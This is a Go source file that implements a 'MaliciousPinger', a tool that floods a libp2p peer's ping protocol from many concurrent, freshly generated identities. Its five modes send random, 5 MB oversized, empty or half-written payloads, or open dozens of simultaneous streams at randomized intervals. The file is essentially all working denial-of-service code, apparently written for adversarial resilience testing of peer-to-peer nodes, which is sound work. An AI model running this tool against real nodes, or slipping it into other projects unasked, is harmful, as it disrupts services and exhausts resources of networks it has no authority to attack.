package resources

import (
	"context"
	"fmt"
	"log"
	"math/rand"
	"sync"
	"time"

	"github.com/libp2p/go-libp2p"
	"github.com/libp2p/go-libp2p/core/crypto"
	"github.com/libp2p/go-libp2p/core/host"
	"github.com/libp2p/go-libp2p/core/network"
	"github.com/libp2p/go-libp2p/core/peer"
	"github.com/multiformats/go-multiaddr"
)

const (
	pingProtocol = "/ipfs/ping/1.0.0"
)

type PingAttackType int

const (
	RandomPayload PingAttackType = iota
	OversizedPayload
	EmptyPayload
	MultipleStreams
	IncompleteWrite
)

type MaliciousPinger struct {
	ctx         context.Context
	targetInfo  *peer.AddrInfo
	running     bool
	stopCh      chan struct{}
	attackType  PingAttackType
	concurrency int
	minInterval time.Duration
	maxInterval time.Duration
}

func NewMaliciousPinger(ctx context.Context, targetMultiaddr string) (*MaliciousPinger, error) {
	targetAddr, err := multiaddr.NewMultiaddr(targetMultiaddr)
	if err != nil {
		return nil, fmt.Errorf("invalid target multiaddr: %w", err)
	}

	addrInfo, err := peer.AddrInfoFromP2pAddr(targetAddr)
	if err != nil {
		return nil, fmt.Errorf("failed to extract peer info from multiaddr: %w", err)
	}

	return &MaliciousPinger{
		ctx:        ctx,
		targetInfo: addrInfo,
		stopCh:     make(chan struct{}),
		attackType: RandomPayload,
	}, nil
}

func (mp *MaliciousPinger) Start(attackType PingAttackType, concurrency int, minInterval, maxInterval time.Duration) {
	if mp.running {
		log.Println("Malicious ping is already running")
		return
	}

	mp.running = true
	mp.attackType = attackType
	mp.concurrency = concurrency
	mp.minInterval = minInterval
	mp.maxInterval = maxInterval

	go mp.run()
}

func (mp *MaliciousPinger) Stop() {
	if !mp.running {
		return
	}
	mp.running = false
	mp.stopCh <- struct{}{}
}

func (mp *MaliciousPinger) IsRunning() bool {
	return mp.running
}

func (mp *MaliciousPinger) run() {
	var wg sync.WaitGroup
	ticker := time.NewTicker(mp.minInterval)
	defer ticker.Stop()

	log.Printf("Starting malicious ping attack against %s with attack type %d", mp.targetInfo.ID, mp.attackType)

	for mp.running {
		select {
		case <-mp.ctx.Done():
			mp.running = false
			return
		case <-mp.stopCh:
			return
		case <-ticker.C:
			for i := 0; i < mp.concurrency; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					if err := mp.executeAttack(); err != nil {
						log.Printf("Error in ping attack: %v", err)
					}
				}()
			}

			if mp.maxInterval > mp.minInterval {
				nextInterval := mp.minInterval + time.Duration(rand.Int63n(int64(mp.maxInterval-mp.minInterval)))
				ticker.Reset(nextInterval)
			}
		}
	}

	wg.Wait()
	log.Println("Malicious ping attack stopped")
}

func (mp *MaliciousPinger) executeAttack() error {
	priv, _, err := crypto.GenerateKeyPair(crypto.Ed25519, -1)
	if err != nil {
		return fmt.Errorf("failed to generate key pair: %v", err)
	}

	h, err := libp2p.New(
		libp2p.Identity(priv),
		libp2p.ListenAddrStrings("/ip4/0.0.0.0/tcp/0"),
		libp2p.ResourceManager(&network.NullResourceManager{}),
	)
	if err != nil {
		return fmt.Errorf("failed to create host: %v", err)
	}
	defer h.Close()

	if err := h.Connect(mp.ctx, *mp.targetInfo); err != nil {
		return fmt.Errorf("failed to connect to target: %v", err)
	}

	log.Printf("Connected to target %s for ping attack", mp.targetInfo.ID)

	switch mp.attackType {
	case RandomPayload:
		return mp.sendRandomPingPayload(h)
	case OversizedPayload:
		return mp.sendOversizedPingPayload(h)
	case EmptyPayload:
		return mp.sendEmptyPingPayload(h)
	case MultipleStreams:
		return mp.openMultiplePingStreams(h)
	case IncompleteWrite:
		return mp.sendIncompletePingPayload(h)
	default:
		return mp.sendRandomPingPayload(h)
	}
}

func (mp *MaliciousPinger) sendRandomPingPayload(h host.Host) error {
	stream, err := h.NewStream(mp.ctx, mp.targetInfo.ID, pingProtocol)
	if err != nil {
		return fmt.Errorf("failed to open ping stream: %v", err)
	}
	defer stream.Close()

	payloadSize := rand.Intn(1024) + 1
	payload := make([]byte, payloadSize)
	rand.Read(payload)

	log.Printf("Sending random ping payload, size: %d bytes", payloadSize)
	_, err = stream.Write(payload)
	if err != nil {
		return fmt.Errorf("failed to write random ping payload: %v", err)
	}

	readCtx, cancel := context.WithTimeout(mp.ctx, 500*time.Millisecond)
	defer cancel()

	respBuf := make([]byte, 1024)
	stream.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
	n, err := stream.Read(respBuf)
	if err != nil {
		log.Printf("No response or error from ping: %v", err)
	} else {
		log.Printf("Received ping response, size: %d bytes", n)
	}

	select {
	case <-readCtx.Done():
	default:
	}

	return nil
}

func (mp *MaliciousPinger) sendOversizedPingPayload(h host.Host) error {
	stream, err := h.NewStream(mp.ctx, mp.targetInfo.ID, pingProtocol)
	if err != nil {
		return fmt.Errorf("failed to open ping stream: %v", err)
	}
	defer stream.Close()

	payloadSize := 5 * 1024 * 1024
	payload := make([]byte, payloadSize)
	rand.Read(payload)

	log.Printf("Sending oversized ping payload, size: %d bytes", payloadSize)
	_, err = stream.Write(payload)
	if err != nil {
		return fmt.Errorf("failed to write oversized ping payload: %v", err)
	}

	return nil
}

func (mp *MaliciousPinger) sendEmptyPingPayload(h host.Host) error {
	stream, err := h.NewStream(mp.ctx, mp.targetInfo.ID, pingProtocol)
	if err != nil {
		return fmt.Errorf("failed to open ping stream: %v", err)
	}
	defer stream.Close()

	log.Printf("Sending empty ping payload")
	_, err = stream.Write([]byte{})
	if err != nil {
		return fmt.Errorf("failed to write empty ping payload: %v", err)
	}

	return nil
}

func (mp *MaliciousPinger) openMultiplePingStreams(h host.Host) error {
	numStreams := 20 + rand.Intn(20)
	log.Printf("Opening %d ping streams simultaneously", numStreams)

	streams := make([]network.Stream, 0, numStreams)
	for i := 0; i < numStreams; i++ {
		stream, err := h.NewStream(mp.ctx, mp.targetInfo.ID, pingProtocol)
		if err != nil {
			log.Printf("Failed to open ping stream %d: %v", i, err)
			continue
		}
		streams = append(streams, stream)
	}

	time.Sleep(2 * time.Second)

	for i, stream := range streams {
		if err := stream.Close(); err != nil {
			log.Printf("Error closing stream %d: %v", i, err)
		}
	}

	return nil
}

func (mp *MaliciousPinger) sendIncompletePingPayload(h host.Host) error {
	stream, err := h.NewStream(mp.ctx, mp.targetInfo.ID, pingProtocol)
	if err != nil {
		return fmt.Errorf("failed to open ping stream: %v", err)
	}
	defer stream.Close()

	payloadSize := 1024
	payload := make([]byte, payloadSize)
	rand.Read(payload)

	halfSize := payloadSize / 2
	log.Printf("Writing incomplete ping payload (first %d of %d bytes)", halfSize, payloadSize)
	_, err = stream.Write(payload[:halfSize])
	if err != nil {
		return fmt.Errorf("failed to write first half of ping payload: %v", err)
	}

	time.Sleep(1 * time.Second)

	return nil
}

func AttackTypeFromString(attackType string) PingAttackType {
	switch attackType {
	case "random":
		return RandomPayload
	case "oversized":
		return OversizedPayload
	case "empty":
		return EmptyPayload
	case "multiple":
		return MultipleStreams
	case "incomplete":
		return IncompleteWrite
	default:
		return RandomPayload
	}
}

func GetAttackTypes() []string {
	return []string{
		"random",
		"oversized",
		"empty",
		"multiple",
		"incomplete",
	}
}
